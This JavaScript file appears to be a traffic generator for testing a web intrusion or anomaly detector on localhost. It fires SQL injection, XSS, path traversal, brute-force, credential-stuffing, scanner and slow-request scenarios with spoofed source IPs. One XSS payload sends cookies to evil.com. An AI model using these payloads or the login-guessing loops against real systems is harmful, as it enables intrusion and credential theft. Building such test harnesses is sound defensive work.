const http = require("http");

const CONFIG = {
  host: "localhost",
  port: 80,
  timeout: 2000,
};

const SCENARIOS = {
  SQL_INJECTION: {
    name: "SQL Injection Attack",
    ip: "10.0.0.1",
    count: 5,
    paths: [
      "/api/users?id=1' UNION SELECT * FROM users--",
      "/login?user=admin' OR '1'='1",
      "/search?q='; DROP TABLE logs; --",
      "/product?id=1 AND 1=CONVERT(int, @@version)",
      "/api/data' WAITFOR DELAY '00:00:05'--",
    ],
    method: "GET",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
  },

  XSS_ATTACK: {
    name: "Cross-Site Scripting (XSS)",
    ip: "10.0.0.2",
    count: 5,
    paths: [
      "/search?q=<script>alert('XSS')</script>",
      "/comment?text=<img src=x onerror=alert(1)>",
      "/profile?name=<svg onload=alert('XSS')>",
      "/post?body=<iframe src='javascript:alert(1)'>",
      "/api?callback=<script>document.location='http://evil.com?cookie='+document.cookie</script>",
    ],
    method: "GET",
    ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
  },

  PATH_TRAVERSAL: {
    name: "Path Traversal Attack",
    ip: "10.0.0.3",
    count: 5,
    paths: [
      "/../../etc/passwd",
      "/images/../../../config.php",
      "/download?file=../../../../windows/win.ini",
      "/static/..\\..\\..\\boot.ini",
      "/admin/..\\..\\..\\.env",
    ],
    method: "GET",
    ua: "python-requests/2.28.1",
  },

  BRUTE_FORCE: {
    name: "Brute Force Attack",
    ip: "10.0.0.4",
    count: 25,
    path: "/login",
    method: "POST",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    generatePayload: (i) => `username=admin&password=wrong_password_${i}`,
  },

  VULN_SCANNER: {
    name: "Vulnerability Scanner",
    ip: "10.0.0.5",
    count: 20,
    paths: [
      "/wp-admin/setup-config.php",
      "/.git/config",
      "/.env",
      "/config.php.bak",
      "/backup.sql",
      "/phpinfo.php",
      "/adminer.php",
      "/api/v1/swagger",
      "/graphql",
      "/actuator/health",
      "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
      "/cgi-bin/php5",
      "/shell.php",
      "/cmd.php",
      "/webshell",
    ],
    method: "GET",
    ua: "Nmap Scripting Engine",
  },

  ML_ACTIVATION: {
    name: "ML Activation - High Error Rate Attack",
    ip: "172.17.0.1",
    count: 60,
    paths: {
      legitimate: ["/", "/home", "/catalog"],
      errors: ["/nonexistent", "/fake", "/invalid", "/404", "/wrong"],
      admin: ["/admin", "/.env"],
    },
    method: "GET",
    ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
  },

  CREDENTIAL_STUFFING: {
    name: "Credential Stuffing (Multi-IP)",
    ips: ["10.0.0.7", "10.0.0.8", "10.0.0.9", "10.0.0.10"],
    countPerIp: 8,
    path: "/login",
    method: "POST",
    ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    generatePayload: (i) => `username=user${i}@test.com&password=Password123`,
  },

  API_ABUSE: {
    name: "API Abuse / Rate Limit Bypass",
    ip: "10.0.0.11",
    count: 80,
    paths: [
      "/api/v1/users",
      "/api/v1/products",
      "/api/v1/orders",
      "/api/v1/search",
      "/api/v1/analytics",
    ],
    method: "GET",
    ua: "PostmanRuntime/7.32.3",
    isParallel: false,
  },

  SLOW_ATTACK: {
    name: "Slow HTTP Attack",
    ip: "10.0.0.12",
    count: 30,
    path: "/",
    method: "GET",
    ua: "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
    slowMode: true,
    delayMs: 500,
  },
};

async function sendRequest(scenario, i, customIp = null) {
  let targetPath;
  if (scenario.paths) {
    if (Array.isArray(scenario.paths)) {
      targetPath = scenario.paths[i % scenario.paths.length];
    } else {
      const legitPaths = scenario.paths.legitimate;
      const errorPaths = scenario.paths.errors;
      const adminPaths = scenario.paths.admin;

      if (scenario.name === SCENARIOS.ML_ACTIVATION.name) {
        if (i % 5 !== 0) {
          targetPath = errorPaths[i % errorPaths.length];
        } else {
          targetPath = legitPaths[i % legitPaths.length];
        }
        if (i % 10 === 0 && i > 0) {
          targetPath = adminPaths[i % adminPaths.length];
        }
      } else {
        targetPath = legitPaths[i % legitPaths.length];
      }
    }
  } else {
    targetPath = scenario.path;
  }

  const encodedPath = encodeURI(targetPath);
  const ip = customIp || scenario.ip;

  return new Promise((resolve) => {
    const options = {
      hostname: CONFIG.host,
      port: CONFIG.port,
      path: encodedPath,
      method: scenario.method || "GET",
      headers: {
        "X-Forwarded-For": ip,
        "User-Agent":
          scenario.ua ||
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        Connection: "keep-alive",
      },
      timeout: CONFIG.timeout,
    };

    const req = http.request(options, (res) => {
      let body = "";
      res.on("data", (chunk) => {
        body += chunk;
      });
      res.on("end", () => {
        const isError = res.statusCode >= 400;
        const icon = isError ? "❌" : "✓";
        console.log(`  ${icon} ${ip} -> ${targetPath} [${res.statusCode}]`);
        resolve({ status: res.statusCode, isError });
      });
    });

    req.on("error", (e) => {
      console.log(`   ${ip} -> ${targetPath} [BLOCKED: ${e.code}]`);
      resolve({ status: "BLOCKED", isError: true });
    });

    req.on("timeout", () => {
      req.destroy();
      console.log(`  ⏱ ${ip} -> ${targetPath} [TIMEOUT]`);
      resolve({ status: "TIMEOUT", isError: true });
    });

    if (scenario.method === "POST" && scenario.generatePayload) {
      const body = scenario.generatePayload(i);
      req.write(body);
    } else if (scenario.method === "POST") {
      req.write(`username=admin&password=wrong_pass_${i}`);
    }
    req.end();
  });
}

async function runAttack(scenario) {
  console.log("\n" + "=".repeat(70));
  console.log(`${scenario.name}`);
  console.log("=".repeat(70));
  console.log(`IP: ${scenario.ip || scenario.ips}`);
  console.log(
    `Total requests: ${scenario.count || scenario.countPerIp * scenario.ips?.length || 0}`,
  );

  let successCount = 0;
  let errorCount = 0;

  if (scenario.ips) {
    for (const ip of scenario.ips) {
      console.log(`\n  Attacking from IP: ${ip}`);
      for (let i = 0; i < scenario.countPerIp; i++) {
        const result = await sendRequest(scenario, i, ip);
        if (result.isError) errorCount++;
        else successCount++;
      }
      await new Promise((r) => setTimeout(r, 500));
    }
  } else if (scenario.slowMode) {
    for (let i = 0; i < scenario.count; i++) {
      const result = await sendRequest(scenario, i);
      if (result.isError) errorCount++;
      else successCount++;
      await new Promise((r) => setTimeout(r, scenario.delayMs || 100));
    }
  } else if (scenario.isParallel === false) {
    for (let i = 0; i < scenario.count; i++) {
      const result = await sendRequest(scenario, i);
      if (result.isError) errorCount++;
      else successCount++;
      if ((i + 1) % 20 === 0) {
        console.log(`  Progress: ${i + 1}/${scenario.count}`);
      }
    }
  } else {
    const BURST_SIZE = 15;
    const totalReqs = scenario.count;
    const bursts = Math.ceil(totalReqs / BURST_SIZE);

    for (let burst = 0; burst < bursts; burst++) {
      const start = burst * BURST_SIZE;
      const end = Math.min(start + BURST_SIZE, totalReqs);
      const promises = [];

      for (let i = start; i < end; i++) {
        promises.push(sendRequest(scenario, i));
      }

      const results = await Promise.all(promises);
      for (const result of results) {
        if (result.isError) errorCount++;
        else successCount++;
      }

      if (burst < bursts - 1) {
        await new Promise((r) => setTimeout(r, 500));
      }
    }
  }

  const total = successCount + errorCount;
  const finalErrorRate = errorCount / total;
}

async function runAll() {
  console.log("\n");
  console.log(`\nTarget: http://${CONFIG.host}:${CONFIG.port}\n`);

  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.SQL_INJECTION);
  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.XSS_ATTACK);
  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.PATH_TRAVERSAL);
  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.BRUTE_FORCE);
  await new Promise((r) => setTimeout(r, 3000));

  await runAttack(SCENARIOS.VULN_SCANNER);
  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.ML_ACTIVATION);
  await new Promise((r) => setTimeout(r, 3000));

  await runAttack(SCENARIOS.CREDENTIAL_STUFFING);
  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.API_ABUSE);
  await new Promise((r) => setTimeout(r, 2000));

  await runAttack(SCENARIOS.SLOW_ATTACK);

  console.log("\n" + "=".repeat(70));
  console.log("ALL ATTACKS COMPLETED");
  console.log("=".repeat(70));
}

runAll().catch(console.error);
